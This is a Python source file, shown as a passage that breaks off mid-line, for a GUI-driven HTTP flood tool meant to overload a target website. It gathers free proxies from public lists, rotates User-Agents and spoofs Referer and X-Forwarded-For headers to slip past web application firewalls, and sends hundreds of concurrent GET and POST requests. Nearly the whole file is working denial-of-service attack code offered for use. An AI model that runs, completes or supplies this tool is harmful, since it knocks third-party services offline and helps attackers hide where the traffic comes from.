import sys
import requests
import asyncio
import aiohttp
import random
import re
import itertools
import time
from urllib.parse import urlparse

# PyQt5 imports for the GUI
from PyQt5.QtWidgets import (QApplication, QMainWindow, QVBoxLayout, QWidget,
                             QLabel, QLineEdit, QPushButton, QMessageBox,
                             QCheckBox, QHBoxLayout, QComboBox)
from PyQt5.QtGui import QFont
from PyQt5.QtCore import QThread, Qt, pyqtSignal

# --- ADVANCED CONFIGURATION ---

# A massive list of User-Agents for maximum stealth
USER_AGENTS = [
    # Chrome
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    # Firefox
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    # Safari
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15",
    # Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
    # Mobile
    "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
]

# A much larger list of proxy sources for better coverage
PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=get&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
    "https://spys.me/proxy.txt",
    "https://www.proxy-list.download/api/v1/get?type=http",
]

# A list of referers to make traffic look like it's coming from other sites
REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.facebook.com/",
    "https://www.twitter.com/",
    "https://www.reddit.com/",
    "https://www.youtube.com/",
]

# --- ADVANCED ATTACK THREAD ---

class AttackThread(QThread):
    # We only need a signal for critical status updates, not for every log line
    status_signal = pyqtSignal(str) 

    def __init__(self, target_url, num_requests, duration, use_proxies, use_post, stealth_mode, mixed_mode):
        super().__init__()
        self.target_url = target_url
        self.num_requests = num_requests
        self.duration = duration
        self.is_attacking = True
        self.use_proxies = use_proxies
        self.use_post = use_post
        self.stealth_mode = stealth_mode
        self.mixed_mode = mixed_mode
        self.proxy_list = []
        self.success_count = 0
        self.error_count = 0

    async def fetch_proxies(self, session, url):
        """Asynchronously fetch proxies from a given URL."""
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                text = await response.text()
                proxies = re.findall(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{2,5})", text)
                return [f"http://{ip}:{port}" for ip, port in proxies]
        except Exception:
            return [] 

    async def get_all_proxies(self):
        """Gather proxies from multiple sources concurrently."""
        if not self.use_proxies:
            return []

        print("[*] Fetching proxies from multiple sources...")
        async with aiohttp.ClientSession() as session:
            tasks = [self.fetch_proxies(session, url) for url in PROXY_SOURCES]
            proxy_lists = await asyncio.gather(*tasks)
            all_proxies = list(itertools.chain.from_iterable(proxy_lists))
            unique_proxies = list(set(all_proxies))
            print(f"[+] Fetched and deduplicated {len(unique_proxies)} proxies.")
            return unique_proxies

    def get_realistic_headers(self):
        """Generate a highly realistic set of headers to bypass WAFs."""
        ua = random.choice(USER_AGENTS)
        headers = {
            "User-Agent": ua,
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Cache-Control": "max-age=0",
        }
        
        if self.stealth_mode:
            headers["Referer"] = random.choice(REFERERS)
            headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        
        return headers

    async def send_request(self, session, proxy=None):
        """Send a single HTTP request, GET or POST."""
        if not self.is_attacking:
            return

        headers = self.get_realistic_headers()
        timeout = aiohttp.ClientTimeout(total=15)
        method = "POST" if (self.use_post or (self.mixed_mode and random.choice([True, False]))) else "GET"

        try:
            if method == "POST":
                data = {'foo': 'bar' * 100}
                async with session.post(self.target_url, data=data, headers=headers, proxy=proxy, timeout=timeout) as response:
                    self.success_count += 1
                    print(f"[+] {response.status} - {method} - {proxy[:25] if proxy else 'Direct'}...") # Truncate proxy for cleaner log
            else:
                async with session.get(self.target_url, headers=headers, proxy=proxy, timeout=timeout) as response:
                    self.success_count += 1
                    print(f"[+] {response.status} - {method} - {proxy[:25] if proxy else 'Direct'}...")
        except asyncio.TimeoutError:
            self.error_count += 1
            print(f"[-] Timeout - {method} - {proxy[:25] if proxy else 'Direct'}...")
        except Exception:
            self.error_count += 1
            # Silently handle other exceptions to avoid flooding the log

    async def attack(self):
        """The main attack loop, managing concurrent tasks."""
        self.proxy_list = await self.get_all_proxies()
        proxy_cycle = itertools.cycle(self.proxy_list) if self.proxy_list else None

        start_time = time.time()
        tasks_sent = 0
        active_tasks = set()
        semaphore = asyncio.Semaphore(500) # Limit concurrency

        # Use a modern TLS connector to help bypass fingerprinting
        connector = aiohttp.TCPConnector(force_close=True, limit=0, ttl_dns_cache=300)
        
        async with aio
